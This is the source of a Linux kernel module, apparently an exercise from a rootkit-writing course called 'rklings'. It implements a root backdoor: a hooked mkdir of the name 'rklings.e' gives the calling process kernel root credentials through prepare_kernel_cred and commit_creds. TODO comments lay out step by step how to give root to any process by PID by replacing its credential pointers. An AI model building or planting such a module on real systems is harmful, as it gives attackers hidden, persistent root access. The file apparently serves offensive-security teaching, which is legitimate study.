// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/string.h>

#include "rklings_hook.h"

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

// Implement rk_escalate_pid(int pid):
// - rcu_read_lock()
// - find_task_by_vpid(pid) to locate the task
// - Return -ESRCH if not found
// - Return -EINVAL if task->mm is NULL (kernel thread)
// - prepare_kernel_cred(&init_task) for root credentials
// - rcu_assign_pointer to replace task->real_cred and task->cred
// - put_cred on the old credentials
// - rcu_read_unlock()

RK_ON_MKDIR(name) {
	if (strcmp(name, "rklings.e") == 0)
		return rk_escalate();

	// TODO: Handle "rklings.e.PID" format
	// - Check for "rklings.e." prefix (10 chars)
	// - Parse the PID with kstrtoint(suffix, 10, &pid)
	// - Call rk_escalate_pid(pid)

	return -ENOENT;
}

static int __init rk_init(void)
{
	return rk_hook_start();
}

static void __exit rk_exit(void)
{
	rk_hook_stop();
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings PID escalation");
